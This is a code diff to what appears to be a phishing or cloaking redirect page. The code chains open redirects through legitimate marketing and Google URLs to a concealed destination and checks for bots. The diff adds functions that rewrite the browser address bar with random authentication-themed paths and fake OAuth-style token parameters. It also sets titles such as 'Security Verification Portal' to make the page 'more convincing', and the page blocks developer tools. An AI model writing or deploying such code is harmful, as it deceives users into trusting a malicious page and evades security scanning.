@@ -7,6 +7,208 @@
     // Configuration
     const REDIRECT_URL = 'https://public-usa.mkt.dynamics.com/api/orgs/742da8ce-1b76-f011-8589-000d3a106307/r/8Uu2c1ToLUGfS8eugg4CAAIAAAA?msdynmkt_target=%7B%22TargetUrl%22%3A%22https%253A%252F%252Fwww.google.com%252Furl%253Fq%253Dhttps%25253A%25252F%25252Fdjyt-s04.eu1.hs-sales-engage.com%25252FCtc%25252FDQ%25252B23284%25252FdjYT-s04%25252FJll8VMXNW7YbdcM6lZ3ldW4dYkTk1Rrbh-W4tPVpb60ww0JV801_44gWhjKW5rqjJH5F1H7RW3QJ2681HBRQqN4QWjlSCKTbFW3rZcsT8Y-BC-W2NVKY_9dLn08W1_t_Vp7CtglFVZH6lx8MDHCwW2L9CGd3KHjt1W85p2wy4Vxb1lMLL8BlgWYWmW8rYBtj3fLWG7W4tpYXl4PCx10W6brBmy2bTLT8W86JWzW4_wgJcW2BVQrC1DNQHkVfx5BJ1NwZDtW5wkQZw5rFwGHW45gT5q7R9bSfW8dbz1K600zH-W1Zh_502nF7JQVGFBC27SZtkmW1JLPd67NRzcTW4xGvBk6rh7lRW7H8Lr11j9DPvVKZMFx93XZSgW7DzWF75pvFlLW8dMGjD70_V2kW2FbZcK8rF_gTW14GC0T4lrlTDW9b1PXf1-jkryW3KTkZ08Fx7ySW62fwDS9jjzBmW9b22Jb4f-dx3W3Z7Zjv6d-4tcW8QTVSH84KH_hW3h3By35VM83sW48ZNKx6RK8QkW7Ydwh_5dFZmNW45n-fS2RHN6DW9lnNtX1L9rb0W2m-pXX2KYh-dN6Y9thBmLDjkW2XK5Y02tDD3SW4vl5sY7mVZL1VsTbwX17gtnVW60BDYp6QGQk0W7yNm4h3mhmwpN5r4TrQrlHPrN3ccwj6t-P-bW7kpGbn68GwdHW398xDG6sbLCRW6Fkr9C5wWtlSW8fKrp-3PmdTgW6tWPSK3Wl6wNW25RtlS7HqjR7W91jRdf8m-DTJN8-D7MNNdh4KW8v7JJl5qCLCFW3DbcP090yNtSW5s8Wjf1qJ757W1B8xjl4TTxvJW7l8Z5t5LgPd9W35yK042g6zssW5K5PkN1Nd_MhW57H4HD4yrcJPW3H_rf77ckNnnN3ZtBF8c3hpPW5nhLKX7m4dvDW6Vx05W3Ljt_yW1zgw_N64Cq33W8b6wHg7726wGf5mwj0M04%2526sa%253DD%2526sntz%253D1%2526usg%253DAOvVaw2tpLERLriKYMm4csbeD_jo%22%2C%22RedirectOptions%22%3A%7B%225%22%3Anull%2C%221%22%3Anull%7D%7D&msdynmkt_digest=tJ7QG46gwp3uTHYYbojbBBeglZ308aNuXF%2FUyxOwWKg%3D&msdynmkt_secretVersion=a3955a744d9049f88dd8bdc1907bf2bf';
     const REDIRECT_DELAY = 3;
+
+    // Generate random URL paths to make each visit look unique
+    function generateRandomPaths() {
+        const pathSegments = [
+            // Common website paths
+            'dashboard', 'admin', 'login', 'auth', 'secure', 'verify', 'access', 'portal',
+            'account', 'profile', 'settings', 'api', 'docs', 'help', 'support', 'contact',
+            'about', 'services', 'products', 'solutions', 'resources', 'downloads',
+            'news', 'blog', 'events', 'careers', 'partners', 'developers',
+            
+            // Security/verification themed
+            'security', 'verification', 'validate', 'check', 'confirm', 'authorize',
+            'authenticate', 'identity', 'compliance', 'protection', 'safety',
+            
+            // Common file/folder names
+            'assets', 'static', 'public', 'private', 'shared', 'common', 'lib',
+            'src', 'app', 'web', 'site', 'page', 'content', 'media', 'files',
+            
+            // Random technical terms
+            'endpoint', 'gateway', 'proxy', 'redirect', 'forward', 'bridge',
+            'handler', 'processor', 'manager', 'controller', 'service'
+        ];
+
+        const fileExtensions = [
+            '', '.html', '.php', '.aspx', '.jsp', '.do', '.action'
+        ];
+
+        const randomSegments = [];
+        const numSegments = Math.floor(Math.random() * 3) + 1; // 1-3 segments
+
+        for (let i = 0; i < numSegments; i++) {
+            const segment = pathSegments[Math.floor(Math.random() * pathSegments.length)];
+            const hasId = Math.random() < 0.3; // 30% chance of adding ID
+            
+            if (hasId) {
+                const id = Math.floor(Math.random() * 10000) + 1000;
+                randomSegments.push(segment + '-' + id);
+            } else {
+                randomSegments.push(segment);
+            }
+        }
+
+        // Add file extension to last segment sometimes
+        if (Math.random() < 0.4) { // 40% chance
+            const lastIndex = randomSegments.length - 1;
+            const ext = fileExtensions[Math.floor(Math.random() * fileExtensions.length)];
+            randomSegments[lastIndex] += ext;
+        }
+
+        return '/' + randomSegments.join('/');
+    }
+
+    // Generate long complex random parameters and paths
+    function generateLongRandomString(length) {
+        const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
+        let result = '';
+        for (let i = 0; i < length; i++) {
+            result += chars.charAt(Math.floor(Math.random() * chars.length));
+        }
+        return result;
+    }
+
+    function generateComplexParams() {
+        const paramNames = [
+            'session', 'token', 'id', 'ref', 'source', 'utm_source', 'utm_medium',
+            'campaign', 'version', 'v', 'timestamp', 'hash', 'key', 'auth',
+            'verify', 'check', 'validate', 'secure', 'access', 'portal',
+            'signature', 'digest', 'nonce', 'state', 'callback', 'redirect_uri',
+            'client_id', 'response_type', 'scope', 'challenge', 'method',
+            'code', 'grant_type', 'refresh_token', 'access_token'
+        ];
+
+        const params = new URLSearchParams();
+        const numParams = Math.floor(Math.random() * 5) + 3; // 3-7 parameters
+
+        for (let i = 0; i < numParams; i++) {
+            const paramName = paramNames[Math.floor(Math.random() * paramNames.length)];
+            let paramValue;
+
+            if (paramName.includes('timestamp') || paramName === 'v') {
+                paramValue = Date.now().toString();
+            } else if (paramName.includes('token') || paramName.includes('signature') || paramName.includes('hash')) {
+                // Long complex tokens/signatures
+                paramValue = generateLongRandomString(Math.floor(Math.random() * 50) + 30); // 30-80 chars
+            } else if (paramName.includes('id') || paramName === 'session' || paramName === 'nonce') {
+                paramValue = generateLongRandomString(Math.floor(Math.random() * 20) + 15); // 15-35 chars
+            } else if (paramName === 'state' || paramName === 'challenge') {
+                paramValue = generateLongRandomString(Math.floor(Math.random() * 30) + 20); // 20-50 chars
+            } else {
+                paramValue = generateLongRandomString(Math.floor(Math.random() * 15) + 8); // 8-23 chars
+            }
+
+            params.append(paramName, paramValue);
+        }
+
+        return params.toString();
+    }
+
+    // Generate additional random path segments
+    function generateComplexPath() {
+        const pathSegments = [
+            // Common website paths
+            'dashboard', 'admin', 'login', 'auth', 'secure', 'verify', 'access', 'portal',
+            'account', 'profile', 'settings', 'api', 'docs', 'help', 'support', 'contact',
+            'about', 'services', 'products', 'solutions', 'resources', 'downloads',
+            'news', 'blog', 'events', 'careers', 'partners', 'developers',
+            
+            // Security/verification themed
+            'security', 'verification', 'validate', 'check', 'confirm', 'authorize',
+            'authenticate', 'identity', 'compliance', 'protection', 'safety',
+            
+            // Common file/folder names
+            'assets', 'static', 'public', 'private', 'shared', 'common', 'lib',
+            'src', 'app', 'web', 'site', 'page', 'content', 'media', 'files',
+            
+            // Random technical terms
+            'endpoint', 'gateway', 'proxy', 'redirect', 'forward', 'bridge',
+            'handler', 'processor', 'manager', 'controller', 'service',
+            
+            // Additional complex paths
+            'oauth', 'saml', 'sso', 'federation', 'callback', 'webhook',
+            'integration', 'connector', 'middleware', 'interface', 'protocol'
+        ];
+
+        const fileExtensions = [
+            '', '.html', '.php', '.aspx', '.jsp', '.do', '.action', '.cgi', '.pl'
+        ];
+
+        const randomSegments = [];
+        const numSegments = Math.floor(Math.random() * 4) + 2; // 2-5 segments
+
+        for (let i = 0; i < numSegments; i++) {
+            const segment = pathSegments[Math.floor(Math.random() * pathSegments.length)];
+            const hasId = Math.random() < 0.4; // 40% chance of adding ID
+            
+            if (hasId) {
+                const id = Math.floor(Math.random() * 100000) + 1000;
+                randomSegments.push(segment + '-' + id);
+            } else {
+                randomSegments.push(segment);
+            }
+        }
+
+        // Sometimes add a very long random segment at the end
+        if (Math.random() < 0.6) { // 60% chance
+            const longSegment = generateLongRandomString(Math.floor(Math.random() * 40) + 20); // 20-60 chars
+            randomSegments.push(longSegment);
+        }
+
+        // Add file extension to last segment sometimes
+        if (Math.random() < 0.3) { // 30% chance
+            const lastIndex = randomSegments.length - 1;
+            const ext = fileExtensions[Math.floor(Math.random() * fileExtensions.length)];
+            randomSegments[lastIndex] += ext;
+        }
+
+        return '/' + randomSegments.join('/');
+    }
+
+    // Update browser URL without page reload
+    function updateBrowserURL() {
+        try {
+            const complexPath = generateComplexPath();
+            const complexParams = generateComplexParams();
+            
+            // Sometimes add additional path segments after parameters
+            let finalURL = window.location.origin + complexPath + '?' + complexParams;
+            
+            // 50% chance to add extra path segments after the parameters (like your example)
+            if (Math.random() < 0.5) {
+                const extraPath = '/' + generateLongRandomString(Math.floor(Math.random() * 60) + 40);
+                finalURL += extraPath;
+            }
+            
+            // Update URL in browser without reload
+            history.pushState({}, '', finalURL);
+            
+            // Also update document title to make it more convincing
+            const titles = [
+                'Security Verification Portal',
+                'Access Verification Required', 
+                'Authentication Gateway',
+                'Secure Access Portal',
+                'Identity Verification System',
+                'Security Checkpoint',
+                'Authorized Access Only',
+                'Verification Required',
+                'OAuth Authentication Service',
+                'SAML Identity Provider',
+                'Single Sign-On Portal',
+                'Federation Gateway',
+                'API Access Control',
+                'Token Validation Service'
+            ];
+            
+            document.title = titles[Math.floor(Math.random() * titles.length)];
+            
+        } catch (e) {
+            // Silently handle any errors with URL manipulation
+            console.debug('URL update skipped');
+        }
+    }
     
     // Comprehensive bot detection
     function runBotDetection() {
@@ -353,6 +555,9 @@
 
         // Block dev tools
         blockDevTools();
+
+        // Update browser URL with random paths
+        updateBrowserURL();
 
         // Create professional landing page
         const verifyButton = createLandingPage();
